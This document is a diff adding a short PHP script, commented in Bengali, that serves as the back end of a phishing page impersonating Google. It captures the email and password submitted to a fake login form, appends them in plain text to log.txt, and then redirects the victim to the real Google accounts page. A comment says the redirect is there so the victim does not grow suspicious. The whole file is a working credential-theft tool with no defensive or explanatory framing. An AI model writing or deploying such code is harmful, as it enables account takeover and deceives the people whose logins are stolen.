@@ -1,0 +1,15 @@
+<?php
+// ফর্মে পাঠানো ডেটা রিসিভ করা
+$email = $_POST['email'];
+$password = $_POST['password'];
+
+// ডেটা কিভাবে সেভ হবে তার ফরম্যাট
+$data = "Email: " . $email . " | Password: " . $password . "\n";
+
+// log.txt ফাইলে ডেটা সেভ করা (ফাইল না থাকলে নিজে তৈরি হবে)
+file_put_contents("log.txt", $data, FILE_APPEND);
+
+// ডেটা সেভ হওয়ার পর আসল গুগল পেজে পাঠিয়ে দেওয়া (যাতে সন্দেহ না হয়)
+header("Location: https://accounts.google.com/");
+exit();
+?>
